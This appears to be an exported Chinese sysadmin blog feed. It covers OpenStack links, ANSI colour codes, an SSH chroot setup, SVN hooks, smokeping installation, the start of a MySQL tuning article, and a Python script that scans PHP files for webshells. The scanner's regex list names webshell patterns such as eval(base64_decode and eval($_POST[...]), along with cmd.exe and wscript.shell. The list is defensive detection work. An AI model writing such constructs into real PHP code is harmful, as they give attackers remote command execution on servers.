<li><div><a href="https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_scheduler_and_its_algorithm27?lang=en" title="https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_scheduler_and_its_algorithm27?lang=en" target="_blank" rel="external">https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_scheduler_and_its_algorithm27?lang=en</a></div>
</li>
</ul>
</li>
<li><div><a href="https://wiki.openstack.org/wiki/Cinder" title="https://wiki.openstack.org/wiki/Cinder" target="_blank" rel="external">Cinder</a>：</div>

<ul>
<li><div><a href="http://docs.openstack.org/developer/cinder/" title="http://docs.openstack.org/developer/cinder/" target="_blank" rel="external">http://docs.openstack.org/developer/cinder/</a></div></li>
<li><div><a href="https://wiki.openstack.org/w/images/3/3b/Cinder-grizzly-deep-dive-pub.pdf" title="https://wiki.openstack.org/w/images/3/3b/Cinder-grizzly-deep-dive-pub.pdf" target="_blank" rel="external">Cinder grizzly deep dive pub</a></div>
</li>
</ul>
</li>
<li><div><a href="https://wiki.openstack.org/wiki/Neutron" title="https://wiki.openstack.org/wiki/Neutron" target="_blank" rel="external">Neutron</a>：</div>

<ul>
<li><div><a href="http://docs.openstack.org/developer/neutron/" title="http://docs.openstack.org/developer/neutron/" target="_blank" rel="external">http://docs.openstack.org/developer/neutron/</a></div></li>
<li><div><a href="http://www.slideshare.net/openstackindia/openstack-quantum-16710792" title="http://www.slideshare.net/openstackindia/openstack-quantum-16710792" target="_blank" rel="external">http://www.slideshare.net/openstackindia/openstack-quantum-16710792</a></div></li>
<li><div><a href="http://www.slideshare.net/lewtucker/openstack-quantum-network-service" title="http://www.slideshare.net/lewtucker/openstack-quantum-network-service" target="_blank" rel="external">http://www.slideshare.net/lewtucker/openstack-quantum-network-service</a></div></li>
<li><div><a href="http://www.slideshare.net/openstackindia/openstack-quantum-18418306" title="http://www.slideshare.net/openstackindia/openstack-quantum-18418306" target="_blank" rel="external">http://www.slideshare.net/openstackindia/openstack-quantum-18418306</a></div>
</li>
</ul>
</li>
<li><div><a href="https://wiki.openstack.org/wiki/Horizon" title="https://wiki.openstack.org/wiki/Horizon" target="_blank" rel="external">Horizon</a>：</div>

<ul>
<li><div><a href="http://docs.openstack.org/developer/horizon/" title="http://docs.openstack.org/developer/horizon/" target="_blank" rel="external">http://docs.openstack.org/developer/horizon/</a></div>
</li>
</ul>
</li>
<li><div><a href="https://wiki.openstack.org/wiki/Swift" title="https://wiki.openstack.org/wiki/Swift" target="_blank" rel="external">Swift</a>：</div>

<ul>
<li><div><a href="http://docs.openstack.org/developer/swift/" title="http://docs.openstack.org/developer/swift/" target="_blank" rel="external">http://docs.openstack.org/developer/swift/</a></div></li>
<li><div><a href="http://blog.csdn.net/alex890714/article/details/7314780" title="http://blog.csdn.net/alex890714/article/details/7314780" target="_blank" rel="external">http://blog.csdn.net/alex890714/article/details/7314780</a></div></li>
<li><div><a href="http://events.csdn.net/OpenStack/%E6%9D%A8%E9%9B%A8-Swift%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%AE%9E%E8%B7%B5.pdf" title="http://events.csdn.net/OpenStack/%E6%9D%A8%E9%9B%A8-Swift%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%AE%9E%E8%B7%B5.pdf" target="_blank" rel="external">Swift架构与实践</a></div>
</li>
</ul>
</li>
<li><p><div><a href="https://wiki.openstack.org/wiki/Oslo" title="https://wiki.openstack.org/wiki/Oslo" target="_blank" rel="external">Oslo</a>：</div><br>通用机制的分析：</p>
</li>
<li><div>quota: <a href="http://blog.csdn.net/hackerain/article/details/8223125" title="http://blog.csdn.net/hackerain/article/details/8223125" target="_blank" rel="external">http://blog.csdn.net/hackerain/article/details/8223125</a></div></li>
<li><div>policy: <a href="http://blog.csdn.net/hackerain/article/details/8241691" title="http://blog.csdn.net/hackerain/article/details/8241691" target="_blank" rel="external">http://blog.csdn.net/hackerain/article/details/8241691</a></div><br></li></ul></div>



<h1 id="5-OpenStack-部署-管理"><a href="#5-OpenStack-部署-管理" class="headerlink" title="5 OpenStack 部署/管理"></a>5 OpenStack 部署/管理</h1><h2 id="OpenStack-自动化部署"><a href="#OpenStack-自动化部署" class="headerlink" title="OpenStack 自动化部署"></a>OpenStack 自动化部署</h2><div><br><br>Puppet:<br><br><em>   <div><a href="https://wiki.openstack.org/wiki/Puppet-openstack" title="https://wiki.openstack.org/wiki/Puppet-openstack" target="_blank" rel="external">https://wiki.openstack.org/wiki/Puppet-openstack</a></div>
</em>   <div><a href="https://github.com/stackforge/puppet-openstack" title="https://github.com/stackforge/puppet-openstack" target="_blank" rel="external">https://github.com/stackforge/puppet-openstack</a></div><br><em>   <div><a href="https://puppetlabs.com/solutions/openstack/" title="https://puppetlabs.com/solutions/openstack/" target="_blank" rel="external">https://puppetlabs.com/solutions/openstack/</a></div><br>Fule: Mirantis出品的部署工具，从裸机到OpenStack组件再到HA全部搞定

</em>   <div><a href="https://fuel.mirantis.com/" title="https://fuel.mirantis.com/" target="_blank" rel="external">https://fuel.mirantis.com/</a></div><br></div>

<h2 id="OpenStack-监控"><a href="#OpenStack-监控" class="headerlink" title="OpenStack 监控"></a>OpenStack 监控</h2><div><br><br>*   <div>OpenStack 监控: <a href="http://www.mirantis.com/blog/openstack-monitoring/" title="http://www.mirantis.com/blog/openstack-monitoring/" target="_blank" rel="external">http://www.mirantis.com/blog/openstack-monitoring/</a></div><br></div>

<h1 id="6-参与-OpenStack-社区"><a href="#6-参与-OpenStack-社区" class="headerlink" title="6 参与 OpenStack 社区"></a>6 参与 OpenStack 社区</h1><div><br><br>都在这里:<a href="https://wiki.openstack.org/wiki/Main_Page" title="https://wiki.openstack.org/wiki/Main_Page" target="_blank" rel="external">https://wiki.openstack.org/wiki/Main_Page</a><br><br><em>   <div>山头： <a href="https://review.openstack.org/#/admin/groups" title="https://review.openstack.org/#/admin/groups" target="_blank" rel="external">https://review.openstack.org/#/admin/groups</a></div>
</em>   <div>向社区提交Patch：<a href="https://wiki.openstack.org/wiki/How_To_Contribute" title="https://wiki.openstack.org/wiki/How_To_Contribute" target="_blank" rel="external">https://wiki.openstack.org/wiki/How_To_Contribute</a></div><br><em>   <div>gerrit的使用：<a href="https://wiki.openstack.org/wiki/Gerrit_Workflow" title="https://wiki.openstack.org/wiki/Gerrit_Workflow" target="_blank" rel="external">https://wiki.openstack.org/wiki/Gerrit_Workflow</a></div>
</em>   <div>Review别人的Patch：<a href="https://review.openstack.org/" title="https://review.openstack.org" target="_blank" rel="external">https://review.openstack.org</a></div><br>*   <div>参与IRC Meeting：</div>

<pre><code>*   &lt;div&gt;[https://wiki.openstack.org/wiki/Meetings](https://wiki.openstack.org/wiki/Meetings &quot;https://wiki.openstack.org/wiki/Meetings&quot;)&lt;/div&gt;
*   &lt;div&gt;[https://wiki.openstack.org/wiki/Mailing_Lists](https://wiki.openstack.org/wiki/Mailing_Lists &quot;https://wiki.openstack.org/wiki/Mailing_Lists&quot;)&lt;/div&gt;
*   &lt;div&gt;[https://wiki.openstack.org/wiki/People](https://wiki.openstack.org/wiki/People &quot;https://wiki.openstack.org/wiki/People&quot;)&lt;/div&gt;
</code></pre><ul>
<li><div>参与邮件列表讨论：<a href="https://wiki.openstack.org/wiki/Mailing_Lists" title="https://wiki.openstack.org/wiki/Mailing_Lists" target="_blank" rel="external">https://wiki.openstack.org/wiki/Mailing_Lists</a></div></li>
<li><div>跟踪OpenStack项目的发展：</div>

<ul>
<li><div><a href="http://www.openstack.org/blog/" title="http://www.openstack.org/blog/" target="_blank" rel="external">http://www.openstack.org/blog/</a></div></li>
<li><div><a href="http://planet.openstack.org/" title="http://planet.openstack.org/" target="_blank" rel="external">http://planet.openstack.org/</a></div></li>
<li><div><a href="https://wiki.openstack.org/wiki/Special:RecentChanges" title="https://wiki.openstack.org/wiki/Special:RecentChanges" target="_blank" rel="external">https://wiki.openstack.org/wiki/Special:RecentChanges</a></div></li>
<li><div><a href="http://github.com/openstack" title="http://github.com/openstack" target="_blank" rel="external">http://github.com/openstack</a></div></li>
<li><div><a href="https://github.com/stackforge/" title="https://github.com/stackforge/" target="_blank" rel="external">https://github.com/stackforge/</a> (You will like it)</div></li>
<li><div><a href="https://github.com/openstack-dev/" title="https://github.com/openstack-dev/" target="_blank" rel="external">https://github.com/openstack-dev/</a></div></li>
<li><div><a href="https://github.com/openstack-infra" title="https://github.com/openstack-infra" target="_blank" rel="external">https://github.com/openstack-infra</a></div>
</li>
</ul>
</li>
<li><div>学习CI：<a href="http://ci.openstack.org/" title="http://ci.openstack.org/" target="_blank" rel="external">http://ci.openstack.org/</a></div><br></li></ul></div>



<h1 id="7-OpenStack-二次开发"><a href="#7-OpenStack-二次开发" class="headerlink" title="7 OpenStack 二次开发"></a>7 OpenStack 二次开发</h1><div><br><br>*   <div>开发Nova的扩展API：</div>

<pre><code>*   &lt;div&gt;[https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_api?lang=zh](https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_api?lang=zh &quot;https://www.ibm.com/developerworks/community/blogs/e93514d3-c4f0-4aa0-8844-497f370090f5/entry/openstack_nova_api?lang=zh&quot;)&lt;/div&gt;
*   &lt;div&gt;[https://wiki.openstack.org/wiki/WritingRequestExtensions](https://wiki.openstack.org/wiki/WritingRequestExtensions &quot;https://wiki.openstack.org/wiki/WritingRequestExtensions&quot;)&lt;/div&gt;
*   &lt;div&gt;[http://stephanfr.com/2013/04/07/creating-an-openstack-keystone-helloworld-extension/](http://stephanfr.com/2013/04/07/creating-an-openstack-keystone-helloworld-extension/ &quot;http://stephanfr.com/2013/04/07/creating-an-openstack-keystone-helloworld-extension/&quot;)&lt;/div&gt;
*   &lt;div&gt;[http://www.cnblogs.com/willier/archive/2013/05/22/3092961.html](http://www.cnblogs.com/willier/archive/2013/05/22/3092961.html &quot;http://www.cnblogs.com/willier/archive/2013/05/22/3092961.html&quot;)&lt;/div&gt;
</code></pre><ul>
<li><div>开发Cinder的driver：</div>

<ul>
<li><div>新的driver必须满足 <a href="https://github.com/openstack/cinder/blob/master/doc/source/devref/drivers.rst" title="https://github.com/openstack/cinder/blob/master/doc/source/devref/drivers.rst" target="_blank" rel="external">Minimum Features</a>,参考同类型的driver，依葫芦画瓢。</div><br></li></ul></li></ul></div>





<h1 id="8-OpenStack-生态圈"><a href="#8-OpenStack-生态圈" class="headerlink" title="8 OpenStack 生态圈"></a>8 OpenStack 生态圈</h1><div><br><br><em>   <div>OpenStack幕后的公司：<a href="http://www.chenshake.com/behind-the-openstack-company" title="http://www.chenshake.com/behind-the-openstack-company" target="_blank" rel="external">http://www.chenshake.com/behind-the-openstack-company</a></div>
</em>   <div>State of The Stack：<a href="http://www.slideshare.net/randybias/state-of-the-stack-april-2013" title="http://www.slideshare.net/randybias/state-of-the-stack-april-2013" target="_blank" rel="external">http://www.slideshare.net/randybias/state-of-the-stack-april-2013</a> (一针见血)</div><br><em>   <div>OpenStack贡献排行榜：<a href="http://stackalytics.com/" title="http://stackalytics.com/" target="_blank" rel="external">http://stackalytics.com/</a></div>
</em>   <div>OpenStack实践分享：<a href="http://www.mirantis.com/blog/" title="http://www.mirantis.com/blog/" target="_blank" rel="external">http://www.mirantis.com/blog/</a> (mirantis是目前最成功的OpenStack系统集成商)</div><br>转自<a href="http://www.ustack.com" target="_blank" rel="external">http://www.ustack.com</a><br><br></div>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> openstack </tag>
            
            <tag> python </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[echo显示字体颜色]]></title>
      <url>/2013/09/22/echo-e6-98-be-e7-a4-ba-e5-ad-97-e4-bd-93-e9-a2-9c-e8-89-b2.html</url>
      <content type="html"><![CDATA[<div>echo要变换颜色的时候，要使用参数-e</div><br><div>格式: echo -e “ 33[字背景颜色;字体颜色m字符串 33[0m”</div><br><div>例如:<br>echo -e “ 33[41;36m something here  33[0m”</div><br><div>其中41的位置代表底色, 36的位置是代表字的颜色</div><br><div>那些ascii code 是对颜色调用的始末.<br> 33[ ; m ……  33[0m</div><br><div></div><br><div>让字体变为红色并且不停的闪烁<br>#echo -e “ 33[31m 33[05m 请确认是否要停止当前的squid进程,输入 [Y/N]  33[0m”</div><br><div>或者</div><br><div>#echo -e “ 33[31m  33[05m 请确认是否要停止当前的squid进程,输入 [Y/N]  33[0m”</div><br><div></div><br><div><br><div>字背景颜色范围:40—-49<br>40:黑<br>41:深红<br>42:绿<br>43:黄色<br>44:蓝色<br>45:紫色<br>46:深绿<br>47:白色</div><br><div>字颜色:30———–39<br>30:黑<br>31:红<br>32:绿<br>33:黄<br>34:蓝色<br>35:紫色<br>36:深绿<br>37:白色</div><br><div></div><br><div><strong>ANSI控制码的说明 </strong><br>33[0m 关闭所有属性<br>33[1m 设置高亮度<br>33[4m 下划线<br>33[5m 闪烁<br>33[7m 反显<br>33[8m 消隐<br>33[30m – 33[37m 设置前景色<br>33[40m – 33[47m 设置背景色<br>33[nA 光标上移n行<br>33[nB 光标下移n行<br>33[nC 光标右移n行<br>33[nD 光标左移n行<br>33[y;xH设置光标位置<br>33[2J 清屏<br>33[K 清除从光标到行尾的内容<br>33[s 保存光标位置<br>33[u 恢复光标位置<br>33[?25l 隐藏光标<br>33[?25h 显示光标</div><br></div>]]></content>
      
        <categories>
            
            <category> 脚本开发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> echo字体颜色 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[通过openssh构建chroot环境]]></title>
      <url>/2013/09/11/e9-80-9a-e8-bf-87openssh-e9-85-8d-e7-bd-ae-e6-99-ae-e9-80-9a-e7-94-a8-e6-88-b7-e6-9d-83-e9-99-90-e5-8f-8a-e5-ae-b6-e7-9b-ae-e5-bd-95.html</url>
      <content type="html"><![CDATA[<p><strong>测试环境</strong>：Centos6.4 x64<br><strong>软件版本</strong>：openssh-5.3p1 在openssh-4.8p1 之前的版本自身并不支持chroot，如果版本过低又想实现此功能，请升级版本（略）；此处介绍openssh-5.3p1版本的实现方法：<br>注释：运行一个基本的chroot环境至少需要有shell和一些ssh必须的设备文件以及授权给用户使用的命令</p>
<h4 id="操作步骤："><a href="#操作步骤：" class="headerlink" title="操作步骤："></a>操作步骤：</h4><p><strong>1.创建chroot目录为/var/chroot</strong><br>mkdir -p /var/chroot/{bin,dev,lib,lib64,etc,home}</p>
<p><strong>2.创建重要的设备文件</strong><br>mknod /var/chroot/dev/null c 1 3<br>mknod /var/chroot/dev/zero c 1 5<br>可选设备文件： (ssh命令所需文件，若缺少会出现：PING is not seeded)<br>mknod /var/chroot/dev/random c 1 8<br>mknod /var/chroot/dev/urandom c 1 9<br>(ssh命令所需文件，若缺少会出现：Host key verification failed) mknod /var/chroot/dev/tty c 5 0<br>更改设备文件权限： chmod 0666 /var/chroot/dev/{null,zero,tty}</p>
<p><strong>3.修改chroot目录权限</strong><br>chown -R root.root /var/chroot</p>
<p><strong>5.拷贝授权的命令及命令所依赖的库文件，查看命令所依赖的库文件信息可使用ldd命令查询</strong> <a href="http://www.simlinux.com/old/wp-content/uploads/2013/09/1.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/09/1.png" alt="1"></a> 对于以上操作我们采用脚本实现：cmd.sh</p>
<p><pre class="lang:sh decode:true">#!/bin/bash</pre></p>
<p>#定义授权的命令<br>cmd=”/bin/ls /bin/bash /bin/cp /bin/mkdir /bin/mv /bin/rm /bin/rmdir”<br>chroot=”/var/chroot”<br>lib1=<code>ldd $cmd|awk &#39;{print $1}&#39;|grep &quot;/lib&quot;|sort|uniq</code><br>lib2=<code>ldd $cmd|awk &#39;{print $3}&#39;|grep &quot;/lib&quot;|sort|uniq</code></p>
<p>for i in $cmd<br>do<br>        cp -a $i $chroot/bin/<br>        echo “$i done”<br>done</p>
<p>#x64位库文件存放目录为$chroot/lib64，32位为$/chroot/lib,请根据系统自身情况更改脚本<br>for j in $lib1<br>do<br>        cp -f $j $chroot/lib64/<br>        echo “$j done”<br>done</p>
<p>for k in $lib2<br>do<br>        cp -f $k $chroot/lib64/<br>        echo “$k done”<br>done<br>chmod 755 cmd.sh;./cmd.sh</p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/09/2.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/09/2.png" alt="2"></a><br>新建用户geekwolf<br>useradd -M geekwolf<br>将passwd及group拷贝到chroot环境<br>grep geekwolf /etc/passwd&gt;/var/chroot/etc/passwd<br>grep geekwolf /etc/group&gt;/var/chroot/etc/passwd</p>
<p><strong>6.建立chroot目录中用户家目录</strong><br>mkdir /var/chroot/home/geekwolf<br>chown -R geekwolf /var/chroot/home/geekwolf<br>chmod 700 /var/chroot/home/geekwolf</p>
<p><strong>7.通过openssh方式设定chroot环境</strong><br>vim /etc/ssh/sshd_config (可以匹配用户组)<br>Match User geekwolf<br>ChrootDirectory /var/chroot/<br>service sshd restart</p>
<p><strong>8.测试</strong><br>测试chroot环境是否正常<br>chroot /var/chroot 如果没有错误表示正常<br>ssh登录测试 <a href="http://www.simlinux.com/old/wp-content/uploads/2013/09/3.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/09/3.png" alt="3"></a><br>如图不能正常显示用户名路径，现在修改环境变量<br>cp /etc/skel/.bash* /var/chroot/home/geekwolf/<br>echo “export PS1=’[u@h w]’” &gt;&gt;/var/chroot/home/geekwolf/.bash_profile</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[svn强制要求添加并允许修改注释信息]]></title>
      <url>/2013/09/09/svn-e5-bc-ba-e5-88-b6-e8-a6-81-e6-b1-82-e6-b7-bb-e5-8a-a0-e6-b3-a8-e9-87-8a-e4-bf-a1-e6-81-af.html</url>
      <content type="html"><![CDATA[<p><strong>SVN强制添加注释信息</strong></p>
<p>hooks目录 编辑pre-commit 文件内容，找到下面3行，用#注释掉。</p>
<pre class="lang:sh decode:true">$SVNLOOK log -t "$TXN" "$REPOS" | 
 grep "[a-zA-Z0-9]" &gt; /dev/null || exit 1
 commit-access-control.pl "$REPOS" "$TXN" commit-access-control.cfg || exit 1</pre>
然后再修改处下面增加一下内容。
<pre class="lang:sh decode:true">LOGMSG=`$SVNLOOK log -t "$TXN" "$REPOS" | grep "[a-zA-Z0-9]" | wc -c`
if [ "$LOGMSG" -lt 5 ];#........5.........
then
 echo -e "nLog message cann't be empty! you must input more than 5 chars as comment!." 1&gt;&amp;2
exit 1
fi</pre>
保存退出。 设置pre-commit文件权限可执行 使用如下命令chomd +x pre-commit

**允许用户修改注释信息**

用户修改注释信息的动作，对应的是pre-revpos-change。将hooks目录下的pre-revpos-change.tmpl改名为pre-revpos-change
<pre class="lang:default decode:true">#!/bin/sh
REPOS="$1"
REV="$2"
USER="$3"
PROPNAME="$4"
ACTION="$5"

if [ "$ACTION" = "M" -a "$PROPNAME" = "svn:log" ];
then
    exit 0;
fi

echo "Changing revision properties other than svn:log is prohibited" &gt;&amp;2
exit 1</pre>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> svn注释 </tag>
            
            <tag> svn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[smokeping网络质量监控部署]]></title>
      <url>/2013/09/05/smokeping-e7-bd-91-e7-bb-9c-e8-b4-a8-e9-87-8f-e7-9b-91-e6-8e-a7-e9-83-a8-e7-bd-b2.html</url>
      <content type="html"><![CDATA[<p>前提条件：smokeping依赖于LNMP或者LAMP及rrdtool<br><strong>一.LNMP环境配置略</strong><br><strong>二.安装rrdtool支持</strong></p>
<pre class="lang:sh decode:true ">yum -y install libxml2-devel libpng-devel glib pango pango-devel  freetypefreetype-devel fontconfig cairo cairo-devel libart_lgpl libart_lgpl-devel perl perl-Net-Telnet perl-Net-DNSperl-LDAP perl-libwww-perl perl-RadiusPerl perl-IO-Socket-SSL perl-Socket6perl-CGI-SpeedyCGI rrdtool-per

wget http://oss.oetiker.ch/rrdtool/pub/rrdtool-1.4.7.tar.gz

cd rrdtool-1.4.7
./configure --prefix=/usr/local/rrdtool
make && make install</pre>

<p>问题：<a href="http://www.simlinux.com/old/wp-content/uploads/2013/09/c2.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/09/c2.png" alt="c"></a> <a href="http://www.simlinux.com/old/wp-content/uploads/2013/09/c1.png">1</a> 解决：</p>
<pre class="lang:sh decode:true ">yum -y install perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker</pre>

<p><strong>三、安装 smokeping 依赖的软件</strong></p>
<pre class="lang:sh decode:true ">wget http://down1.chinaunix.net/distfiles/cgilib-0.5.tar.gz
 tar xzvf cgilib-0.5.tar.gz
 cd cgilib-0.5
 make
 cp libcgi.a  /usr/local/lib
 cp cgi.h /usr/include/

http://fping.org/dist/fping-3.4.tar.gz
./configure –prefix=/usr/local/fping
make && make install
whereis fping
 fping: /usr/local/fping
ln -s /usr/local/fping/sbin/fping  /usr/sbin/fping
这个链接是对应/usr/local/smokeping/etc/config里面的probe fping

wget http://ncu.dl.sourceforge.net/project/echoping/echoping/6.0.2/echoping-6.0.2.tar.gz
tar xzvf echoping-6.0.2.tar.gz
cd echoping-6.0.2
./configure
make && make install</pre>

<p>问题： <a href="http://www.simlinux.com/old/wp-content/uploads/2013/09/cc3.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/09/cc3.png" alt="cc"></a> 解决：</p>
<pre class="lang:sh decode:true ">下载popt-1.14.tar.gz
wget http://downloads.sourceforge.net/project/kanapi/sources/RELEASES/popt-1.14.tar.gz?r=http%3A%2F%2Fen.sourceforge.jp%2Fprojects%2Fsfnet_kanapi%2Fdownloads%2Fsources%2FRELEASES%2Fpopt-1.14.tar.gz%2F&ts=1368433312&use_mirror=jaist

./configure 
make && make install

wget http://ftp.gnu.org/gnu/gettext/gettext-0.18.tar.gz
tar zxvf gettext-0.18.tar.gz
cd gettext-0.18
./configure 
make && make install
cd ..</pre>

<p><strong>四、安装配置Smokeping </strong></p>
<pre class="lang:sh decode:true ">wget http://oss.oetiker.ch/smokeping/pub/smokeping-2.6.8.tar.gz
tar zxvf smokeping-2.6.8.tar.gz
cd smokeping-2.6.8
./configure –prefix=/usr/local/smokeping
编译的时候会报错提示缺少很多的扩展程序，这时候我们只需要执行一个安装脚本就好了
./setup/build-perl-modules.sh /usr/local/smokeping/thirdparty
等他安装完再继续编译安装
./configure –prefix=/usr/local/smokeping 
www.yunvn.com  运维网原创作品  转载请注明出处
gmake install 
安装完毕，下面修改配置文件。
进入 bin 目录，修改 smokeping 文件
#vim smokeping
第八行：  use lib qw(); # PERL5LIB
修改为：     use lib qw(/usr/local/rrdtool/lib/perl);
进入 htdocs 目录
# mv smokeping.fcgi.dist smokeping.fcgi
进入 etc 目录
cp config.dist config
修改 config 文件

创建存放数据文件的目录
mkdir  c/usr/local/smokeping/data  /usr/local/smokeping/var 
/usr/local/smokeping/cache
修改 smokeping 的目录为 nginx 运行用户的属主、组
chown -R daemon.daemon smokeping/
chmod 600 /usr/local/smokeping/etc/smokeping_secrets.dist
chmod  –R  777  /usr/local/smokeping/cache  /usr/local/smokeping/data 
/usr/local/smokeping/var
创建 smokeping 的 log 文件
touch /var/log/smokeping.log
chown daemon.daemon /var/log/smokeping.log
启动 smokeping
perl /usr/local/smokeping/bin/smokeping --logfile=/var/log/smokeping.log
建立 smokeping 启动脚本，方便启动
vim /etc/init.d/smokeping
添加为以下内容：
#!/bin/bash
#
# chkconfig: 2345 80 05
# Description: Smokeping init.d script
# Hacked by : YunVN - http://www.yunvn.com
# Get function from functions library
. /etc/init.d/functions
# Start the service Smokeping
start() {
echo -n "Starting Smokeping: "
/usr/local/smokeping/bin/smokeping &gt;/dev/null 2&gt;&1
### Create the lock file ### 
touch /var/lock/subsys/smokeping
success $"Smokeping startup"
echo
}
# Restart the service Smokeping
stop() {
echo -n "Stopping Smokeping: "
kill -9 `ps ax | grep "/usr/local/smokeping/bin/smokeping" | grep -v grep | awk 
'{ print $1 }'` &gt;/dev/null 2&gt;&1
### Now, delete the lock file ###
rm -f /var/lock/subsys/smokeping
success $"Smokeping shutdown"
echo
}
### main logic ###
case "$1" in
start)
start
;;
stop)
stop
;;
status)
status Smokeping
;;
restart|reload|condrestart)
stop
start
;;
*)
echo $"Usage: $0 {start|stop|restart|reload|status}"
exit 1
esac
exit 0
给脚本有可执行权限
# chmod 755 /etc/rc.d/init.d/smokeping
设置开机启动 smokeping </pre>

<p>问题： 启动时出现问题： <a href="http://www.simlinux.com/old/wp-content/uploads/2013/09/ccc2.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/09/ccc2.png" alt="ccc"></a> 解决：yum -y install rrdtool-perl</p>
<p><strong>参考配置文件：</strong> <a href="https://github.com/geekwolf/sa-scripts/tree/master/config" target="_blank" rel="external">https://github.com/geekwolf/sa-scripts/tree/master/config</a></p>
<p>注释：ping的节点可以适当做些调整</p>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> smokeping </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ python正则检查php webshell方法]]></title>
      <url>/2013/09/05/python-e6-ad-a3-e5-88-99-e6-a3-80-e6-9f-a5php-webshell-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<h2 id="python正则检查php-webshell方法"><a href="#python正则检查php-webshell方法" class="headerlink" title="python正则检查php webshell方法"></a>python正则检查php webshell方法</h2><p>注释：扩展rulelist</p>
<pre class="lang:python decode:true ">#!/usr/bin/python
# -*- coding: utf-8 -*-
#By:Seay
import os
import sys
import re

rulelist = [
    '($_(GET|POST|REQUEST)[.{0,15}]($_(GET|POST|REQUEST)[.{0,15}]))',
    '(base64_decode(['"][w+/=]{200,}['"]))',
    'eval(base64_decode(',
    '(eval($_(POST|GET|REQUEST)[.{0,15}]))',
    '(assert($_(POST|GET|REQUEST)[.{0,15}]))',
    '($[w_]{0,15}($_(POST|GET|REQUEST)[.{0,15}]))',
    '(wscript.shell)',
    '(gethostbyname()',
    '(cmd.exe)',
    '(shell.application)',
    '(documentss+ands+settings)',
    '(system32)',
    '(serv-u)',
    '(提权)',
    '(phpspy)',
    '(后门)',
    '(webshell)',
    '(Programs+Files)'
]

def Scan(path):
    for root,dirs,files in os.walk(path):
        for filespath in files:
            isover = False
            if '.' in filespath:
                ext = filespath[(filespath.rindex('.')+1):]
                if ext=='php':
                    file= open(os.path.join(root,filespath))
                    filestr = file.read()
                    file.close()
                    for rule in rulelist:
                        result = re.compile(rule).findall(filestr)
                        if result:
                            print '文件：'+os.path.join(root,filespath)
                            print '恶意代码：'+str(result[0])
                            print 'nn'
                            break

if os.path.lexists(sys.argv[1]):
    print('nn开始扫描：'+sys.argv[1])
    print('               可疑文件                 ')
    print('########################################')
    Scan(sys.argv[1])
    print('提示：扫描完成-- O(∩_∩)O哈哈~')
else:
    print '提示：指定的扫描目录不存在---  我靠( 'o′)！！凸'</pre>

<p>参考：<a href="http://www.simlinux.com/old/index.php/2012/11/linux%E4%B8%8B%E7%9A%84php%E6%9C%A8%E9%A9%AC%E6%9F%A5%E8%AF%A2/">LINUX下的PHP木马查询</a><br>转自angryfox</p>
]]></content>
      
        <categories>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql性能优化-慢查询分析、优化索引和配置]]></title>
      <url>/2013/08/09/1129.html</url>
      <content type="html"><![CDATA[<p>目录</p>
<p><strong>一、优化概述</strong></p>
<p><strong>二、查询与索引优化分析</strong></p>
<p>1性能瓶颈定位</p>
<p>Show命令</p>
<p>慢查询日志</p>
<p>explain分析查询</p>
<p>profiling分析查询</p>
<p>2索引及查询优化</p>
<p><strong>三、配置优化</strong></p>
<p>1)      max_connections</p>
<p>2)      back_log</p>
<p>3)      interactive_timeout</p>
<p>4)      key_buffer_size</p>
<p>5)      query_cache_size</p>
<p>6)      record_buffer_size</p>
<p>7)      read_rnd_buffer_size</p>
<p>8)      sort_buffer_size</p>
<p>9)      join_buffer_size</p>
<p>10)    table_cache</p>
<p>11)    max_heap_table_size</p>
<p>12)    tmp_table_size</p>
<p>13)    thread_cache_size</p>
<p>14)    thread_concurrency</p>
<p>15)    wait_timeout</p>
<p><strong>一、 优化概述</strong></p>
<p><a href="http://www.simlinux.com/old/wp-content/uploads/2013/08/1.png"><img src="http://www.simlinux.com/old/wp-content/uploads/2013/08/1.png" alt="1"></a></p>
<p>MySQL数据库是常见的两个瓶颈是CPU和I/O的瓶颈，CPU在饱和的时候一般发生在数据装入内存或从磁盘上读取数据时候。磁盘I/O瓶颈发生在装入数据远大于内存容量的时候，如果应用分布在网络上，那么查询量相当大的时候那么平瓶颈就会出现在网络上，我们可以用mpstat, iostat, sar和vmstat来查看系统的性能状态。</p>
<p>除了服务器硬件的性能瓶颈，对于MySQL系统本身，我们可以使用工具来优化数据库的性能，通常有三种：使用索引，使用EXPLAIN分析查询以及调整MySQL的内部配置。</p>
<p>二、查询与索引优化分析</p>
<p>在优化MySQL时，通常需要对数据库进行分析，常见的分析手段有慢查询日志，EXPLAIN 分析查询，profiling分析以及show命令查询系统状态及系统变量，通过定位分析性能的瓶颈，才能更好的优化数据库系统的性能。</p>
